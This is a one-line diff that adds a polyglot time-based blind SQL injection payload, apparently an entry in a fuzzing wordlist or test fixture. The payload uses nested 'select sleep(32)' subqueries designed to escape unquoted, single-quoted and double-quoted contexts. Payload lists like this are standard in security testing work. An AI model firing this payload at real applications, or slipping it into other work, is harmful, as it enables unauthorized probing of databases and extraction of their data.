@@ -1,0 +1,1 @@
+(select(0)from(select(sleep(32)))v)/*'+(select(0)from(select(sleep(32)))v)+'"+(select(0)from(select(sleep(32)))v)+"*/
